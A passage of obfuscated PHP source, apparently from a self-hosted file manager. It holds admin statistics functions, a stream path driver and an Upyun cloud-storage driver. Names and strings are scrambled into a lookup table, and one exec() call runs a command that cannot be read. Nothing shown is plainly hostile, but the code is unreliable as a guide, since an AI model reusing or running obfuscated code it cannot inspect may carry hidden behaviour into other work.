$š§ùæ[1954]: $®¥Ì¢»Ÿ = 1; do { $Ş¤¤ê¾ = date($š§ùæ[2139], strtotime("\x2d\x20{$®¥Ì¢»Ÿ}\40\155\x6f\156\x74\x68\163")); $ÇæÍ³Á[] = $Ş¤¤ê¾; $®¥Ì¢»Ÿ++; } while ($ ÓèĞá¾ < $Ş¤¤ê¾); break; case $š§ùæ[2140]: $¡½²ë†î = (int) date($š§ùæ[2138], strtotime($ ÓèĞá¾)); $–î·ÍÑ = (int) date($š§ùæ[2138]); if ($¡½²ë†î >= $–î·ÍÑ) { break; } for ($¡½²ë†î; $¡½²ë†î < $–î·ÍÑ; $¡½²ë†î++) { $ÇæÍ³Á[] = $¡½²ë†î . $š§ùæ[2141]; } break; default: break; } if ($ ÓèĞá¾ > end($ÇæÍ³Á)) { array_pop($ÇæÍ³Á); } sort($ÇæÍ³Á); return $ÇæÍ³Á; } public function listTable($ğĞË‹Ã²) { $¹ÁÒ·ç× = ucfirst($ğĞË‹Ã²); return Model($¹ÁÒ·ç×)->listData(); } public function option($‡Î«»ÃÂ) { return call_user_func_array(array($this, $_SERVER[µÅ˜º…æ][2142] . ucfirst($‡Î«»ÃÂ)), array()); } private function optionUser() { $ÍÀûÈæ =& $_SERVER[µÅ˜º…æ]; $Ê’çæÄ = Model($ÍÀûÈæ[617])->count($ÍÀûÈæ[1593]); $³Œáş©Ù = Model($ÍÀûÈæ[617])->where($ÍÀûÈæ[2143])->count($ÍÀûÈæ[1593]); $Ù¶ıÎ…» = intval($GLOBALS[$ÍÀûÈæ[6]][$ÍÀûÈæ[424]][$ÍÀûÈæ[1923]]) / 3600; $Ã¨èÉ¨É = strtotime("\55{$Ù¶ıÎ…»}\40\150\157\165\162\x73"); $£ˆ€¨¡¸ = strtotime(date($ÍÀûÈæ[2125])); if ($Ã¨èÉ¨É < $£ˆ€¨¡¸) { $Ã¨èÉ¨É = $£ˆ€¨¡¸; } $Ï¿¬œ  = array($ÍÀûÈæ[2144] => array($ÍÀûÈæ[1183], $Ã¨èÉ¨É)); $èÁà¥Úİ = (int) Model($ÍÀûÈæ[617])->where($Ï¿¬œ )->count($ÍÀûÈæ[1593]); if (!$èÁà¥Úİ) { $èÁà¥Úİ = 1; } $Ï¿¬œ  = array($ÍÀûÈæ[2144] => array($ÍÀûÈæ[1183], $£ˆ€¨¡¸)); $ÓçÅö± = Model($ÍÀûÈæ[617])->where($Ï¿¬œ )->count($ÍÀûÈæ[1593]); return array($ÍÀûÈæ[858] => (int) $Ê’çæÄ, $ÍÀûÈæ[2145] => (int) ($Ê’çæÄ - $³Œáş©Ù), $ÍÀûÈæ[2146] => (int) $³Œáş©Ù, $ÍÀûÈæ[2147] => (int) $ÓçÅö±, $ÍÀûÈæ[2148] => $èÁà¥Úİ); } private function optionFile() { $öÚØğÍ =& $_SERVER[µÅ˜º…æ]; $àŠ†ˆŒ¡ = $this->sourceSize(); $ÍÌÉ©Ã = array($öÚØğÍ[500] => 0); $á°¨áòñ = Model($öÚØğÍ[932])->where($ÍÌÉ©Ã)->count(); $ÍÌÉ©Ã[$öÚØğÍ[231]] = array($öÚØğÍ[1183], strtotime(date($öÚØğÍ[2125]))); $×İÃ‚÷ = Model($öÚØğÍ[932])->where($ÍÌÉ©Ã)->field(array($öÚØğÍ[948] => $öÚØğÍ[949], $öÚØğÍ[950] => $öÚØğÍ[79]))->find(); $‰ÒÄµ‹œ = array($öÚØğÍ[863] => $àŠ†ˆŒ¡[$öÚØğÍ[79]], $öÚØğÍ[2118] => $àŠ†ˆŒ¡[$öÚØğÍ[2118]], $öÚØğÍ[2149] => $àŠ†ˆŒ¡[$öÚØğÍ[79]] - $àŠ†ˆŒ¡[$öÚØğÍ[2118]], $öÚØğÍ[2150] => (int) (isset($×İÃ‚÷[$öÚØğÍ[79]]) ? $×İÃ‚÷[$öÚØğÍ[79]] : 0), $öÚØğÍ[865] => (int) $á°¨áòñ, $öÚØğÍ[2151] => (int) (isset($×İÃ‚÷[$öÚØğÍ[949]]) ? $×İÃ‚÷[$öÚØğÍ[949]] : 0)); if ($‰ÒÄµ‹œ[$öÚØğÍ[2149]] < 0) { $‰ÒÄµ‹œ[$öÚØğÍ[2149]] = 0; } return $‰ÒÄµ‹œ; } private function optionAccess() { $‡Ã­´Şæ =& $_SERVER[µÅ˜º…æ]; return array($‡Ã­´Şæ[858] => $this->typeLogCnt(), $‡Ã­´Şæ[107] => $this->typeLogCnt($‡Ã­´Şæ[107]), $‡Ã­´Şæ[539] => $this->typeLogCnt($‡Ã­´Şæ[539]), $‡Ã­´Şæ[1335] => $this->typeLogCnt($‡Ã­´Şæ[1335]), $‡Ã­´Şæ[1562] => $this->typeLogCnt($‡Ã­´Şæ[1562]), $‡Ã­´Şæ[684] => $this->typeLogCnt($‡Ã­´Şæ[12], $‡Ã­´Şæ[2129])); } private function typeLogCnt($ïİƒ¾¶“ = '', $Çç’« = "\151\x64") { $‰Ö…—†Á =& $_SERVER[µÅ˜º…æ]; $ßÓŒ¤šü = array($‰Ö…—†Á[107] => array($‰Ö…—†Á[2152], $‰Ö…—†Á[2153]), $‰Ö…—†Á[539] => array($‰Ö…—†Á[2154], $‰Ö…—†Á[2155]), $‰Ö…—†Á[1335] => array($‰Ö…—†Á[2156], $‰Ö…—†Á[2157], $‰Ö…—†Á[2158]), $‰Ö…—†Á[1562] => array($‰Ö…—†Á[2159], $‰Ö…—†Á[2160]), $‰Ö…—†Á[1563] => array($‰Ö…—†Á[2161], $‰Ö…—†Á[2162], $‰Ö…—†Á[2163])); $‡ÑÙ“ä = strtotime(date($‰Ö…—†Á[2125])); $¥¤®á•ı = array($‰Ö…—†Á[231] => array($‰Ö…—†Á[1183], $‡ÑÙ“ä)); if ($ïİƒ¾¶“) { $¥¤®á•ı[$‰Ö…—†Á[33]] = array($‰Ö…—†Á[7], $ßÓŒ¤šü[$ïİƒ¾¶“]); } $‡õ¹¬’ñ = Model($‰Ö…—†Á[2128])->where($¥¤®á•ı)->count($Çç’«); return (int) $‡õ¹¬’ñ; } private function optionServer() { $»§…ß€’ =& $_SERVER[µÅ˜º…æ]; $Ôıøò‘° = $this->diskDriver(); $ˆÌõßñ = KodIO::defaultDriver(); $ìáÃ˜† = array($»§…ß€’[925] => $ˆÌõßñ[$»§…ß€’[487]]); $Ø€å×à¢ = Model($»§…ß€’[560])->where($ìáÃ˜†)->sum($»§…ß€’[79]); $¡íå‡ = explode($»§…ß€’[53], $_SERVER[$»§…ß€’[144]]); $Ë¹¼Ğæ = $¡íå‡[0]; $ÊÀ”»Ò = $GLOBALS[$»§…ß€’[6]][$»§…ß€’[21]]; $Ü¬Ô´¡À = $ÊÀ”»Ò[$»§…ß€’[1145]]; if ($Ü¬Ô´¡À == $»§…ß€’[1133]) { $›äÓ©í± = explode($»§…ß€’[1474], $ÊÀ”»Ò[$»§…ß€’[1144]]); $Ü¬Ô´¡À = $›äÓ©í±[0]; } if ($Ü¬Ô´¡À == $»§…ß€’[1078] || $Ü¬Ô´¡À == $»§…ß€’[900]) { $ÂÜÀí¯õ = Model()->db()->query($»§…ß€’[2164]); $óØ¬Ì© = $ÂÜÀí¯õ[0] && isset($ÂÜÀí¯õ[0][$»§…ß€’[1864]]) ? $ÂÜÀí¯õ[0][$»§…ß€’[1864]] : 0; $Ü¬Ô´¡À = $»§…ß€’[2165] . ($óØ¬Ì© ? $»§…ß€’[8] . $óØ¬Ì© : $»§…ß€’[12]); } $ìú¥ÊŠƒ = $GLOBALS[$»§…ß€’[6]][$»§…ß€’[424]][$»§…ß€’[979]]; return array($»§…ß€’[2166] => $Ôıøò‘° ? $Ôıøò‘°[$»§…ß€’[2167]] : 0, $»§…ß€’[2168] => $Ôıøò‘° ? $Ôıøò‘°[$»§…ß€’[2169]] : 0, $»§…ß€’[2170] => (int) $ˆÌõßñ[$»§…ß€’[2167]] * 1024 * 1024 * 1024, $»§…ß€’[2171] => (int) $Ø€å×à¢, $»§…ß€’[2172] => ucfirst($Ë¹¼Ğæ), $»§…ß€’[2173] => $»§…ß€’[2174] . PHP_VERSION, $»§…ß€’[2175] => phpBuild64() ? 64 : 32, $»§…ß€’[857] => str_replace($»§…ß€’[1309], $»§…ß€’[1161], $Ü¬Ô´¡À), $»§…ß€’[424] => ucfirst($ìú¥ÊŠƒ), $»§…ß€’[32] => $_SERVER[$»§…ß€’[2176]]); } private function diskDriver() { $»ÄşóÜ– =& $_SERVER[µÅ˜º…æ]; $è†¸÷…ü = $»ÄşóÜ–[8]; $àšõ¤ = $GLOBALS[$»ÄşóÜ–[6]][$»ÄşóÜ–[1498]] == $»ÄşóÜ–[1499]; if ($àšõ¤) { $è†¸÷…ü = $»ÄşóÜ–[2177]; if (function_exists($»ÄşóÜ–[2178])) { exec($»ÄşóÜ–[2179], $è¹‚¸¹ç); $è†¸÷…ü = $è¹‚¸¹ç[1] . $»ÄşóÜ–[8]; } } if (!file_exists($è†¸÷…ü)) { return; } if (!function_exists($»ÄşóÜ–[2180])) { return; } $­ï©™Ø× = @disk_total_space($è†¸÷…ü); $‡’ğ¯Â = $­ï©™Ø× - @disk_free_space($è†¸÷…ü); return array($»ÄşóÜ–[2167] => $­ï©™Ø×, $»ÄşóÜ–[2169] => $‡’ğ¯Â); } public function fileChart($¼¾øºöÜ) { $ Æ‡¬ » =& $_SERVER[µÅ˜º…æ]; $øÕË¦„ = Model($ Æ‡¬ »[932]); if (isset($¼¾øºöÜ[$ Æ‡¬ »[1593]])) { return $øÕË¦„->userFileTypeProfile($¼¾øºöÜ[$ Æ‡¬ »[1593]]); } if (isset($¼¾øºöÜ[$ Æ‡¬ »[1496]])) { return $øÕË¦„->groupFileTypeProfile($¼¾øºöÜ[$ Æ‡¬ »[1496]]); } $ç ¨îÊ¹ = $this->sourceSize(); return array($ Æ‡¬ »[863] => $ç ¨îÊ¹[$ Æ‡¬ »[79]], $ Æ‡¬ »[2118] => $ç ¨îÊ¹[$ Æ‡¬ »[2118]], $ Æ‡¬ »[2119] => $øÕË¦„->where(array($ Æ‡¬ »[188] => 1, $ Æ‡¬ »[190] => 0))->sum($ Æ‡¬ »[79]), $ Æ‡¬ »[2120] => $øÕË¦„->where(array($ Æ‡¬ »[188] => 2, $ Æ‡¬ »[190] => 0))->sum($ Æ‡¬ »[79])); } private function sourceSize() { $úáŞğĞ =& $_SERVER[µÅ˜º…æ]; $¾şğ§â¹ = Model($úáŞğĞ[932])->where(array($úáŞğĞ[500] => 0))->sum($úáŞğĞ[79]); $ûíø¤åĞ = Model($úáŞğĞ[2181])->sum($úáŞğĞ[79]); $ßÑéÓ” = Model($úáŞğĞ[560])->sum($úáŞğĞ[79]); return array($úáŞğĞ[79] => (int) $¾şğ§â¹ + (int) $ûíø¤åĞ, $úáŞğĞ[2118] => (int) $ßÑéÓ”); } } goto eĞ°ÇÒ‡ŠÒ; d–½¡ãîÕ : class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ïÊĞÎüĞ, $Á·ÅÍÏÀ = 0) { parent::__construct(); $this->source = $ïÊĞÎüĞ; $this->sourceSize = $Á·ÅÍÏÀ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($äØÛÌ¨î = false) { return $this->sourceSize; } public function getContent($¦°ûÓ = false) { return $this->fileSubstr($¦°ûÓ, 0, $this->sourceSize); } public function fileSubstr($ÓÙ¥Àõà = false, $êï‰”Œ¦ = 0, $ª»ì¶¤İ = 0) { if (!$ª»ì¶¤İ) { $ª»ì¶¤İ = $this->sourceSize; } $åÀ±ö™Œ = $this->sourceSize - $êï‰”Œ¦; if ($ª»ì¶¤İ >= $åÀ±ö™Œ) { $ª»ì¶¤İ = $åÀ±ö™Œ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $êï‰”Œ¦, $ª»ì¶¤İ); } if ($this->sourceType == self::TYPE_FILE) { if ($ª»ì¶¤İ <= 0) { return $_SERVER[µÅ˜º…æ][12]; } $«ì¿ò›– = ftell($this->source); fseek_64($this->source, $«ì¿ò›– + $êï‰”Œ¦); $›•ÊÑ›Ô = @fread($this->source, $ª»ì¶¤İ); fseek_64($this->source, $«ì¿ò›–); return $›•ÊÑ›Ô; } } public function hashMd5($àôºÁ£¦ = false) { return md5($this->getContent()); } public static function hash($…ÖĞ­å, $ØÈÕ¦Åı = 0) { $ÅÅÀ¼óç = new PathDriverStream($…ÖĞ­å, $ØÈÕ¦Åı); return $ÅÅÀ¼óç->hashSimple($…ÖĞ­å); } public static function md5($¬›”™ÚÚ, $“‘»•²– = 0) { $¥Ìãí³Ø = new PathDriverStream($¬›”™ÚÚ, $“‘»•²–); return $¥Ìãí³Ø->hashMd5($¬›”™ÚÚ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\72\57\x2f\x76\x30\56\x61\160\x69\56\x75\160\171\x75\x6e\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¬ë—¿Ø) { parent::__construct(); $this->_init($¬ë—¿Ø); } public function _init($¸Ş£Àà’) { $Ë’ß€ú› =& $_SERVER[µÅ˜º…æ]; foreach ($¸Ş£Àà’ as $’–¥Éü => $¹›ãôü) { if (isset($this->{$’–¥Éü})) { $this->{$’–¥Éü} = $¹›ãôü; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ë’ß€ú›[1750] . LNG($Ë’ß€ú›[1673])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÍÒÌ½¿ó, $ƒİó£³Â = "\107\105\124") { $ãü‚ù­¶ =& $_SERVER[µÅ˜º…æ]; $ÑÓ¯Ú” = gmdate($ãü‚ù­¶[1702]); $ùØ¶ô®Ú = base64_encode(hash_hmac($ãü‚ù­¶[1751], "{$ƒİó£³Â}\x26{$ÍÒÌ½¿ó}\x26{$ÑÓ¯Ú”}", md5("{$this->userpass}"), !0)); $ğß‘Á¤ë = array("\x41\x75\164\150\x6f\x72\151\x7a\141\164\x69\157\x6e\x3a\x55\120\131\125\x4e\x20{$this->username}\72{$ùØ¶ô®Ú}", "\x44\141\164\145\x3a{$ÑÓ¯Ú”}"); return $ğß‘Á¤ë; } public function ussRequest($³Îü¥•Æ, $ØäõÕíö = "\107\x45\x54", $ÕØ€½› = false, $ú‹Ğâ¿š = false, $Á¡üèíö = false) { $æ›ıùŸ =& $_SERVER[µÅ˜º…æ]; $³Îü¥•Æ = trim($³Îü¥•Æ, $æ›ıùŸ[8]); $òï±Æ• = "\x2f{$this->bucket}\57" . rawurlencode($³Îü¥•Æ); $Û²á³Ï¿ = $this->ussHeaders($òï±Æ•, $ØäõÕíö); if ($ú‹Ğâ¿š) { $Û²á³Ï¿ = array_merge($Û²á³Ï¿, $ú‹Ğâ¿š); } $à¼öû‹Ú = url_request($this->endpoint . $òï±Æ•, $ØäõÕíö, $ÕØ€½›, $Û²á³Ï¿, $Á¡üèíö); if (!$à¼öû‹Ú) { $™‚ìºĞ¶ = LNG($æ›ıùŸ[1752]); $this->writeLog($™‚ìºĞ¶); return array($æ›ıùŸ[1403] => !1, $æ›ıùŸ[1393] => $™‚ìºĞ¶); } if (strtolower($ØäõÕíö) == $æ›ıùŸ[227] || in_array($à¼öû‹Ú[$æ›ıùŸ[1403]], array($æ›ıùŸ[261], $æ›ıùŸ[1753]))) { $ÕØ€½› = $à¼öû‹Ú[$æ›ıùŸ[1754]]; if (!$à¼öû‹Ú[$æ›ıùŸ[849]]) { $ÕØ€½› = isset($ÕØ€½›[0]) ? $ÕØ€½›[0] : $æ›ıùŸ[12]; } } else { $ÕØ€½› = json_decode($à¼öû‹Ú[$æ›ıùŸ[1393]], !0); if (!$ÕØ€½›) { $ÕØ€½› = $à¼öû‹Ú[$æ›ıùŸ[1393]]; } else { if (!$à¼öû‹Ú[$æ›ıùŸ[849]] && isset($ÕØ€½›[$æ›ıùŸ[1755]])) { $ÕØ€½› = $ÕØ€½›[$æ›ıùŸ[1755]]; } } } if (!$à¼öû‹Ú[$æ›ıùŸ[849]]) { $this->writeLog($this->__errorMessage($ÕØ€½›)); } return array($æ›ıùŸ[1403] => $à¼öû‹Ú[$æ›ıùŸ[849]], $æ›ıùŸ[1393] => $ÕØ€½›); } private function __errorMessage($şÀÀÔÜª) { $²É¸µ¹ =& $_SERVER[µÅ˜º…æ]; if (!$şÀÀÔÜª) { return $²É¸µ¹[12]; } static $ãÚ¼Œ®Ë = null; if (!$ãÚ¼Œ®Ë) { $ãÚ¼Œ®Ë = I18n::getType(); } if ($ãÚ¼Œ®Ë != $²É¸µ¹[1710]) { return $şÀÀÔÜª; } $ŸŠÀşÃ» = array($²É¸µ¹[1756] => $²É¸µ¹[1757], $²É¸µ¹[1758] => $²É¸µ¹[1759], $²É¸µ¹[1760] => $²É¸µ¹[1759], $²É¸µ¹[1761] => $²É¸µ¹[1762], $²É¸µ¹[1763] => $²É¸µ¹[1764], $²É¸µ¹[1765] => $²É¸µ¹[1766], $²É¸µ¹[1767] => $²É¸µ¹[1768]); return isset($ŸŠÀşÃ»[$şÀÀÔÜª]) ? $ŸŠÀşÃ»[$şÀÀÔÜª] : $şÀÀÔÜª; } public function mkfile($šÙ˜Ö°¿, $üÛ§òÏ¼ = '', $Æğé‹„É = REPEAT_RENAME) { if ($this->setContent($šÙ˜Ö°¿, $üÛ§òÏ¼)) { return $this->getPathOuter($šÙ˜Ö°¿); } return !1; } public function mkdir($Œİüö, $•Ú‡Ü›ï = REPEAT_SKIP) { $†ÂíıË€ =& $_SERVER[µÅ˜º…æ]; $¢À¼Ç = trim($Œİüö, $†ÂíıË€[8]); if ($this->_isFolder($¢À¼Ç)) { return $this->getPathOuter($¢À¼Ç); } $•ñÎÉšó = array($†ÂíıË€[1769]); $Óê½› = $this->ussRequest($¢À¼Ç, $†ÂíıË€[288], !1, $•ñÎÉšó); return $Óê½›[$†ÂíıË€[1403]] ? $this->getPathOuter($¢À¼Ç) : !1; } public function copyFile($íğ¸Éà¤, $ëêùõ¡) { $ÇôÅÅÜ§ =& $_SERVER[µÅ˜º…æ]; $õÌ¾ªÕÏ = array($ÇôÅÅÜ§[1770] . "\x2f{$this->bucket}\x2f{$íğ¸Éà¤}", $ÇôÅÅÜ§[1771]); $Êá·ë = $this->ussRequest($ëêùõ¡, $ÇôÅÅÜ§[253], !1, $õÌ¾ªÕÏ); return $Êá·ë[$ÇôÅÅÜ§[1403]] ? !0 : $this->getPathOuter($ëêùõ¡); } public function moveFile($˜¢­Í²´, $é‚‚ë½Ú) { $ï±æ¹ı =& $_SERVER[µÅ˜º…æ]; $àŞÛ¥Ê– = array($ï±æ¹ı[1772] . "\x2f{$this->bucket}\57{$˜¢­Í²´}", $ï±æ¹ı[1771]); $ÌØòƒûç = $this->ussRequest($é‚‚ë½Ú, $ï±æ¹ı[253], !1, $àŞÛ¥Ê–); return $ÌØòƒûç[$ï±æ¹ı[1403]] ? !0 : $this->getPathOuter($é‚‚ë½Ú); } public function delFile($ú©ù£Ÿù) { $à¾Õ³¨ª =& $_SERVER[µÅ˜º…æ]; $åÛ¦¥Æ = $this->ussRequest($ú©ù£Ÿù, $à¾Õ³¨ª[1773]); return $åÛ¦¥Æ[$à¾Õ³¨ª[1403]] ? !0 : !1; } public function delFolder($Ş³õø¼) { $î„‰Û³ª =& $_SERVER[µÅ˜º…æ]; if (!$this->exist($Ş³õø¼)) { return !0; } $this->listItemCache = !1; $Ëï¿ë¡Ü = $ƒ–œÄÄØ = array(); $this->fileList($Ş³õø¼, $Ëï¿ë¡Ü, $ƒ–œÄÄØ, !0); $this->listItemCache = !0; foreach ($ƒ–œÄÄØ as $ØÆ¯÷ŸË) { $öü‚íõ™ = $this->ussRequest($ØÆ¯÷ŸË[$î„‰Û³ª[32]], $î„‰Û³ª[1773]); if (!$öü‚íõ™[$î„‰Û³ª[1403]]) { return !1; } } usort($Ëï¿ë¡Ü, function ($ğ¯Ü‹¤£, $Äğ¢™È) { $†¨öÍƒ =& $_SERVER[µÅ˜º…æ]; return substr_count($Äğ¢™È, $†¨öÍƒ[8]) - substr_count($ğ¯Ü‹¤£, $†¨öÍƒ[8]); }); foreach ($Ëï¿ë¡Ü as $Îš¡†®î) { $öü‚íõ™ = $this->ussRequest($Îš¡†®î, $î„‰Û³ª[1773]); if (!$öü‚íõ™[$î„‰Û³ª[1403]]) { return !1; } } $öü‚íõ™ = $this->ussRequest($Ş³õø¼, $î„‰Û³ª[1773]); return $öü‚íõ™[$î„‰Û³ª[1403]]; } public function rename($ë›°â¤€, $ÎïŞíãÕ) { if ($this->isFile($ë›°â¤€)) { $ÎïŞíãÕ = get_path_father($ë›°â¤€) . $ÎïŞíãÕ; return $this->moveFile($ë›°â¤€, $ÎïŞíãÕ); } return $this->renameObject($ë›°â¤€, $ÎïŞíãÕ); } public function fileInfo($á†ù˜¥Ã, $ªæÉ¹©˜ = false, $éÅÚÙä’ = array()) { $ôÅÉ¯ =& $_SERVER[µÅ˜º…æ]; $ó¡Øšü¯ = array($ôÅÉ¯[32] => $this->pathThis($á†ù˜¥Ã), $ôÅÉ¯[87] => $this->getPathOuter($ôÅÉ¯[8] . $á†ù˜¥Ã), $ôÅÉ¯[33] => $ôÅÉ¯[230], $ôÅÉ¯[79] => isset($éÅÚÙä’[$ôÅÉ¯[79]]) ? $éÅÚÙä’[$ôÅÉ¯[79]] : 0, $ôÅÉ¯[166] => $this->ext($á†ù˜¥Ã)); if ($ªæÉ¹©˜) { return $ó¡Øšü¯; } $ó¡Øšü¯[$ôÅÉ¯[231]] = $ó¡Øšü¯[$ôÅÉ¯[88]] = 0; $ó¡Øšü¯[$ôÅÉ¯[232]] = $ó¡Øšü¯[$ôÅÉ¯[233]] = !0; if (empty($éÅÚÙä’)) { $éÅÚÙä’ = $this->objectMeta($á†ù˜¥Ã); if (!$éÅÚÙä’) { return $ó¡Øšü¯; } } $ó¡Øšü¯[$ôÅÉ¯[231]] = intval($éÅÚÙä’[$ôÅÉ¯[1774]]); $ó¡Øšü¯[$ôÅÉ¯[88]] = intval($éÅÚÙä’[$ôÅÉ¯[1775]]); $ó¡Øšü¯[$ôÅÉ¯[79]] = $éÅÚÙä’[$ôÅÉ¯[79]]; return $ó¡Øšü¯; } public function folderInfo($¤’¸€¢›, $•Ï­¢ÍÆ = false) { $ö¢„»µ =& $_SERVER[µÅ˜º…æ]; $ğ¶Ì ¼ = array($ö¢„»µ[32] => $this->pathThis($¤’¸€¢›), $ö¢„»µ[87] => $this->getPathOuter($ö¢„»µ[8] . $¤’¸€¢›), $ö¢„»µ[33] => $ö¢„»µ[78]); if ($•Ï­¢ÍÆ) { return $ğ¶Ì ¼; } $ğ¶Ì ¼[$ö¢„»µ[231]] = $ğ¶Ì ¼[$ö¢„»µ[88]] = 0; $ğ¶Ì ¼[$ö¢„»µ[232]] = $ğ¶Ì ¼[$ö¢„»µ[233]] = !0; if (empty($ç¬ÃöÑÃ)) { $ç¬ÃöÑÃ = $this->objectMeta($¤’¸€¢›); if (!$ç¬ÃöÑÃ) { return $ğ¶Ì ¼; } } $ğ¶Ì ¼[$ö¢„»µ[231]] = intval($ç¬ÃöÑÃ[$ö¢„»µ[1774]]); $ğ¶Ì ¼[$ö¢„»µ[88]] = intval($ç¬ÃöÑÃ[$ö¢„»µ[1775]]); return $ğ¶Ì ¼; } private function listObjs($¶ËÛ«¯, $°á³Ÿø = 0, $ıßÖŞÅ„ = 1000) { $£ìµûËû =& $_SERVER[µÅ˜º…æ]; $·¼ù“‰‰ = array($£ìµûËû[1776], $£ìµûËû[1777] . $ıßÖŞÅ„); if ($°á³Ÿø) { $·¼ù“‰‰[] = $£ìµûËû[1778] . $°á³Ÿø; } $á’Ìûê = $this->ussRequest($¶ËÛ«¯, $£ìµûËû[1606], !1, $·¼ù“‰‰); return !$á’Ìûê[$£ìµûËû[1403]] ? !1 : $á’Ìûê[$£ìµûËû[1393]]; } private function fileList($Œ¦¾•¹Ğ, &$Š¸èŞó™, &$ åÓáû, $Òû›‰Ìê = false) { $›ı©ÌÃ× =& $_SERVER[µÅ˜º…æ]; $ÚØ€¯„Ú = $›ı©ÌÃ×[12]; $¶ø–¾š„ = 1000; $Í æš¹ = rtrim($Œ¦¾•¹Ğ, $›ı©ÌÃ×[8]) . $›ı©ÌÃ×[8]; while (!0) { check_abort(); $œÆûÉã = $this->listObjs($Œ¦¾•¹Ğ, $ÚØ€¯„Ú, $¶ø–¾š„); if (!$œÆûÉã) { return !1; } $ÚØ€¯„Ú = isset($œÆûÉã[$›ı©ÌÃ×[1779]]) ? $œÆûÉã[$›ı©ÌÃ×[1779]] : $›ı©ÌÃ×[12]; $ªé¨½©Ú = isset($œÆûÉã[$›ı©ÌÃ×[1780]]) ? $œÆûÉã[$›ı©ÌÃ×[1780]] : array(); foreach ($ªé¨½©Ú as $ˆá¿ûÁ) { $¥°şùŞ½ = $ˆá¿ûÁ[$›ı©ÌÃ×[33]] == $›ı©ÌÃ×[78] ? !0 : !1; $ä­¥ªß = ltrim($Í æš¹ . $ˆá¿ûÁ[$›ı©ÌÃ×[32]], $›ı©ÌÃ×[8]) . ($¥°şùŞ½ ? $›ı©ÌÃ×[8] : $›ı©ÌÃ×[12]); $í®êœõœ = array($›ı©ÌÃ×[32] => $ä­¥ªß, $›ı©ÌÃ×[33] => $¥°şùŞ½ ? $›ı©ÌÃ×[78] : $›ı©ÌÃ×[230], $›ı©ÌÃ×[79] => $ˆá¿ûÁ[$›ı©ÌÃ×[412]], $›ı©ÌÃ×[1775] => $ˆá¿ûÁ[$›ı©ÌÃ×[1781]]); $this->cacheMethodInfoSet($ä­¥ªß, $¥°şùŞ½, $í®êœõœ); if ($¥°şùŞ½) { $Š¸èŞó™[] = $ä­¥ªß; if ($Òû›‰Ìê) { $this->fileList($ä­¥ªß, $Š¸èŞó™, $ åÓáû, $Òû›‰Ìê); } continue; } $ åÓáû[] = $í®êœõœ; } if (count($ªé¨½©Ú) < $¶ø–¾š„) { break; } } $this->cacheMethodInfoSet($Œ¦¾•¹Ğ, !0); } public function listPath($ÓÁÎàİÆ, $›»ÚÛ‰ô = false) { $êÎÇã”î =& $_SERVER[µÅ˜º…æ]; $Åä÷¼ = $Ãá¶õ› = array(); $this->fileList($ÓÁÎàİÆ, $Åä÷¼, $Ãá¶õ›); foreach ($Åä÷¼ as $É¾¯›·  => $í²¨¨Íæ) { $Åä÷¼[$É¾¯›· ] = $this->folderInfo($í²¨¨Íæ, $›»ÚÛ‰ô); } foreach ($Ãá¶õ› as $É¾¯›·  => $í²¨¨Íæ) { $Ãá¶õ›[$É¾¯›· ] = $this->fileInfo($í²¨¨Íæ[$êÎÇã”î[32]], $›»ÚÛ‰ô, $í²¨¨Íæ); } return array($êÎÇã”î[85] => $Åä÷¼, $êÎÇã”î[86] => $Ãá¶õ›); } public function has($ ®­×, $û‰óËÃ† = false, $¶êó¨³ö = true) { $Êèè–® =& $_SERVER[µÅ˜º…æ]; $ñ‹ñ½Ÿ‹ = $Êèè–®[12]; $›‘Ÿ£ºÓ = 500; $º£İš‡á = 0; $·íùÏÊ¬ = 0; $ÛÄ•éÄĞ = rtrim($ ®­×, $Êèè–®[8]) . $Êèè–®[8]; while (!0) { check_abort(); $î­ñ¼§€ = $this->listObjs($ ®­×, $ñ‹ñ½Ÿ‹, $›‘Ÿ£ºÓ); if (!$î­ñ¼§€) { return !1; } $ñ‹ñ½Ÿ‹ = isset($î­ñ¼§€[$Êèè–®[1779]]) ? $î­ñ¼§€[$Êèè–®[1779]] : $Êèè–®[12]; $‹ï«µã… = isset($î­ñ¼§€[$Êèè–®[1780]]) ? $î­ñ¼§€[$Êèè–®[1780]] : array(); if (empty($‹ï«µã…)) { break; } $÷ü²•¦· = array_filter($‹ï«µã…, function ($¶ÔÉ“êÄ) { $Øà¡ Û =& $_SERVER[µÅ˜º…æ]; return $¶ÔÉ“êÄ[$Øà¡ Û[33]] == $Øà¡ Û[78]; }); $§¯“ü–„ = count($‹ï«µã…); $÷ü²•¦· = count($÷ü²•¦·); $¬¾ÕÀè™ = $§¯“ü–„ - $÷ü²•¦·; if ($û‰óËÃ†) { $·íùÏÊ¬ += $÷ü²•¦·; $º£İš‡á += $¬¾ÕÀè™; if ($§¯“ü–„ < $›‘Ÿ£ºÓ) { break; } continue; } if ($¶êó¨³ö) { if ($¬¾ÕÀè™) { return !0; } } else { if ($÷ü²•¦·) { return !0; } } if ($§¯“ü–„ < $›‘Ÿ£ºÓ) { break; } } if ($û‰óËÃ†) { return array($Êèè–®[239] => $º£İš‡á, $Êèè–®[240] => $·íùÏÊ¬); } return !1; } public function listAll($ô«ªÖ•‰) { $ª•ÇøÑí =& $_SERVER[µÅ˜º…æ]; $…¦®¹èÜ = $İşÀ¨ìò = array(); $this->fileList($ô«ªÖ•‰, $…¦®¹èÜ, $İşÀ¨ìò, !0); $ÖÄšôÊ¡ = array_to_keyvalue($İşÀ¨ìò, $ª•ÇøÑí[32]); foreach ($…¦®¹èÜ as $¦Ì¡ÖàÜ) { if (is_string($¦Ì¡ÖàÜ)) { $ÖÄšôÊ¡[$¦Ì¡ÖàÜ] = array($ª•ÇøÑí[79] => 0); } } return $this->listAllFiles($ô«ªÖ•‰, $ÖÄšôÊ¡); } public function canRead($÷ÔóÛ¡¡) { return $this->exist($÷ÔóÛ¡¡) ? !0 : !1; } public function canWrite($ßÏ¿ñƒ½) { return $this->exist($ßÏ¿ñƒ½) ? !0 : !1; } public function 